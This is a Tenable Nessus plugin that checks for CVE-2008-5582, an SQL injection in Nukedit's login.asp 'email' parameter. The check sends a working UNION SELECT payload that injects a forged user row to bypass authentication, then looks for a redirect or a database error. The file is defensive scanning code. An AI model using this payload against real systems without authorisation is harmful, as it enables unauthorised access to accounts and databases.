#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31192);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-5582");
  script_bugtraq_id(28009);
  script_xref(name:"milw0rm", value:"5192");
  script_xref(name:"OSVDB", value:"50063");

  script_name(english:"Nukedit utilities/login.asp email Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication using SQL injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Nukedit, a content management system
written in ASP. 

The version of Nukedit installed on the remote host fails to sanitize
user input to the 'email' parameter of the 'utilities/login.asp'
script before using it in a database query.  An unauthenticated
attacker may be able to exploit this issue to manipulate database
queries to disclose sensitive information, bypass authentication, or
even attack the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Nukedit 4.9.8 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/nukedit", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/utilities/login.asp");

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # If so...
  if (
    'ID="Form2" onsubmit="return Form_Validator' >< res ||
    "document.frmLogin.savepassword2.checked" >< res
  )
  {
    pass = "nessus";
    enc_pass = "ENC0f2cdc33b5be6fe0223bf9e93bba10f9474d8df35bf7d8551c86211dd31ba99e";
    uid = rand() % 0xff;
    gid = rand() % 0xff;

    exploit = string("' UNION SELECT ", uid, ",", gid, ",3,4,'", enc_pass, "',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM tblUsers WHERE 'x'='x");

    postdata = string(
      "password=", pass, "&",
      "email=", urlencode(str:exploit)
    );

    req = string(
      "POST ", url, "?redirect=", SCRIPT_NAME, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (isnull(res)) exit(0);

    # There's a problem if we're redirected or we see a database error.
    if (
      (
        string("utilities/refresh.asp?redirect=", SCRIPT_NAME) >< res &&
        string("userid=", uid, "; expires") >< res 
      ) ||
      (
        "Microsoft JET Database" >< res &&
        "selected tables or queries of a union query do not match" >< res
      )
    )
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
